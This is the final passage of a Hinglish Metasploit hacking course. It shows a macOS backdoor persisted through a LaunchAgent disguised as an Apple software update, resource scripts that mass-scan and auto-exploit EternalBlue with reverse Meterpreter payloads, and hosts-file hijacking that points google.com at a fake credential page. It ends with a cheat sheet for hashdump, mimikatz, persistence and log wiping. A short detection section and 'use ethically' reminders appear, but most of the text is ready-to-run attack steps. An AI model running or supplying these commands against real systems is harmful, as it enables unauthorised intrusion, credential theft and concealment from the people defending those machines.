$ chmod +x /tmp/backdoor.sh

# LaunchAgent plist
$ cat > ~/Library/LaunchAgents/com.apple.softwareupdate.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/backdoor.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

$ launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist

# Test (reboot)
$ sudo reboot

# Listener (Kali)
nc -lvnp 4444
# Connection received after reboot!
```

#### **Pro Tips:**
- Legitimate naam use karo (`com.apple.update`)
- LaunchAgents user-level (easy)
- LaunchDaemons root chahiye (powerful)
- Multiple persistence methods

---

## ⚙️ MODULE 15: Framework Automation & Defense (Pro Level)

### Topic 53: Resource Scripts (.rc files)

**Automation - Ek Click Mein Sab** 🤖

#### **Kya Hai .rc File?**
Resource script ek text file hai jismein Metasploit commands hote hain. Ek baar run karo, saare commands automatically execute!

#### **Example:**
```bash
# handler.rc file
cat > handler.rc << EOF
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

# Run script
msfconsole -r handler.rc

# Auto-start listener!
```

#### **Advanced Example:**
```bash
# auto_pentest.rc
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 445,3389,22
run

use auxiliary/scanner/smb/smb_version
services -p 445 -R
run

use exploit/windows/smb/ms17_010_eternalblue
services -p 445 -R
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit -z
```

---

### Topic 54-56: Defense (Detection & Prevention)

**Defense - Apne Aap Ko Bachao** 🛡️

#### **Meterpreter Detection:**
```bash
# Tool: meterpreter_detection.exe
C:\> meterpreter_detection.exe IDS    # Detect only
[+] Meterpreter found: PID 1234, Path: C:\temp\payload.exe

C:\> meterpreter_detection.exe IPS    # Detect + Kill
[+] Meterpreter detected and killed!
```

#### **Cports (Network Monitoring):**
```bash
# Download: https://www.nirsoft.net/utils/cports.html
# Run Cports
# Check suspicious connections:
# - Unknown remote IPs
# - High data transfer
# - Unusual ports (4444, 4445)
```

#### **Sandbox Analysis:**
```bash
# Website: https://www.hybrid-analysis.com
# Upload suspicious file
# Get complete report:
# - Registry changes
# - Network connections
# - File modifications
# - Behavior analysis
```

#### **Defense Checklist:**
- ✅ Antivirus updated
- ✅ Firewall enabled
- ✅ Network monitoring (Cports)
- ✅ Suspicious files sandbox test
- ✅ Regular security audits

---

### Topic 57: Meterpreter Railgun (Windows API)

**Railgun - Direct Windows API Access** 🔧

#### **Kya Hai Railgun?**
Railgun se aap directly Windows API functions call kar sakte hain. Advanced scripting ke liye powerful!

#### **Example:**
```bash
meterpreter > irb
>> client.railgun.user32.MessageBoxA(0, "You are hacked!", "Alert", "MB_OK")
# Victim ko popup dikhega!

>> client.railgun.kernel32.GetComputerNameA(256, 256)
# Computer name

>> client.railgun.kernel32.Beep(1000, 1000)
# Beep sound (1000 Hz, 1000 ms)

>> client.railgun.user32.LockWorkStation()
# Screen lock!
```

#### **Advanced Example:**
```bash
# Custom script
meterpreter > irb
>> 10.times do
>>   client.railgun.user32.MessageBoxA(0, "Hacked!", "Warning", "MB_OK")
>>   sleep(5)
>> end
# 10 popups har 5 second!
```

---

### Topic 58: Website Redirection (`post/windows/manage/inject_host`)

**Host File Manipulation - Website Hijack** 🌐

#### **Kya Hai Host File?**
`C:\Windows\System32\drivers\etc\hosts` file domain names ko IP addresses se map karti hai. Isse website redirection possible!

#### **Manual Method:**
```bash
meterpreter > shell
C:\> echo 192.168.1.50 www.google.com >> C:\Windows\System32\drivers\etc\hosts
C:\> echo 192.168.1.50 www.facebook.com >> C:\Windows\System32\drivers\etc\hosts

# Victim google.com kholega → Aapki site khulegi!
```

#### **Metasploit Module:**
```bash
use post/windows/manage/inject_host
set SESSION 1
set DOMAIN google.com
set IP 192.168.1.50    # Your Apache server
run

[*] Injecting google.com → 192.168.1.50 into hosts file
[+] Successfully modified hosts file
```

#### **Complete Example:**
```bash
# Step 1: Apache server setup (Kali)
sudo service apache2 start
echo "<h1>Fake Google - Enter Credentials</h1>" > /var/www/html/index.html

# Step 2: Host injection
use post/windows/manage/inject_host
set SESSION 1
set DOMAIN google.com
set IP 192.168.1.50
run

# Step 3: Victim opens google.com
# Fake page dikhega!
# Credentials capture karo

# Note: HTTPS sites (HSTS) bypass nahi hongi
# HTTP sites best targets
```

#### **Limitations:**
- ❌ HTTPS/HSTS sites (facebook.com) bypass nahi
- ✅ HTTP sites kaam karenge
- ✅ Internal sites best targets

---

## 🎁 **ALL MODULES COMPLETE!**

```
┌─────────────────────────────────────────────────────────┐
│  🎉 CONGRATULATIONS! 58/58 Topics Complete! 🎉          │
│                                                          │
│  ✅ Module 1: Metasploit Basics                         │
│  ✅ Module 2: Payloads & msfvenom                       │
│  ✅ Module 3: Recon & Scanning                          │
│  ✅ Module 4: Gaining Access                            │
│  ✅ Module 5: Meterpreter Basics                        │
│  ✅ Module 6: Windows Post-Exploitation (System)        │
│  ✅ Module 7: Credential Theft                          │
│  ✅ Module 8: Stealth & Persistence                     │
│  ✅ Module 9: Data Gathering                            │
│  ✅ Module 10: Pivoting & Lateral Movement              │
│  ✅ Module 11: Active Directory                         │
│  ✅ Module 12: Linux Hacking                            │
│  ✅ Module 13: Android Hacking                          │
│  ✅ Module 14: macOS Hacking                            │
│  ✅ Module 15: Automation & Defense                     │
│                                                          │
│  🏆 You are now a Metasploit Expert! 🏆                 │
└─────────────────────────────────────────────────────────┘
```

---

## 📚 **Complete Pentesting Workflow**

```
1. RECONNAISSANCE
   └─ db_nmap, auxiliary scanners, service enumeration

2. VULNERABILITY SCANNING
   └─ Vulnerability scanners, check exploits

3. EXPLOITATION
   └─ Server-side (ms17_010)
   └─ Client-side (APK, PDF, browser)
   └─ Password attacks (brute force)

4. POST-EXPLOITATION
   └─ Meterpreter (sysinfo, getuid, getsystem)
   └─ Process migration (stability)
   └─ Screenshot/screenshare

5. PRIVILEGE ESCALATION
   └─ Windows: getsystem, UAC bypass
   └─ Linux: SUID, sudo -l
   └─ AD: Kerberoasting, DCSync

6. CREDENTIAL THEFT
   └─ hashdump, mimikatz, /etc/shadow
   └─ Browser passwords, keychain

7. PERSISTENCE
   └─ Windows: Registry, Service
   └─ Linux: Cron, SSH keys
   └─ macOS: LaunchAgents
   └─ Android: APK binding

8. PIVOTING & LATERAL MOVEMENT
   └─ autoroute, portfwd, SOCKS proxy
   └─ psexec, Pass-the-Hash

9. DATA GATHERING
   └─ Browser history, USB history
   └─ Recovery files, contacts, SMS

10. CLEAN TRACKS
    └─ clearev, timestomp
    └─ Remove persistence (if needed)
```

---

## 🎓 **Final Pro Tips**

### **Essential Commands:**
```bash
# Basics
msfconsole -q
search [keyword]
use [module]
show options
set [OPTION] [value]
exploit

# Meterpreter
sysinfo, getuid, getsystem
ps, migrate [PID]
hashdump, load mimikatz
download, upload
screenshot, screenshare
shell

# Pivoting
run autoroute -s [subnet]
portfwd add -l [local] -p [remote] -r [host]
use auxiliary/server/socks_proxy

# Persistence
use exploit/windows/local/persistence
clearev, timestomp
```

### **Remember:**
- 🎯 Always `check` before `exploit`
- 🔍 `getsystem` → `migrate lsass` → `hashdump`
- 💾 `setg LHOST` for efficiency
- ⚡ `exploit -z` for background sessions
- 🚀 Document everything for reports!
- ⚖️ **Use ethically, legally, with permission only!**

---

## 🎉 **Course Complete!**

```
┌─────────────────────────────────────────────────────────┐
│                                                          │
│  Aapne 15 Modules complete kiye!                        │
│  58 Topics master kiye!                                 │
│  Beginner se Expert ban gaye! 🚀                        │
│                                                          │
│  Ab aap:                                                 │
│  ✅ Windows/Linux/macOS/Android hack kar sakte hain     │
│  ✅ Active Directory compromise kar sakte hain          │
│  ✅ Pivoting aur lateral movement kar sakte hain        │
│  ✅ Complete pentesting kar sakte hain                  │
│                                                          │
│  Next Steps:                                            │
│  1. Practice on legal platforms (HackTheBox, TryHackMe) │
│  2. Get certified (CEH, OSCP)                           │
│  3. Join bug bounty programs                            │
│  4. Always hack ethically! ⚖️                           │
│                                                          │
│  Happy Ethical Hacking! 🎓                              │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

**🎊 Congratulations! Aapki Metasploit journey complete! 🎊**


=============================================================
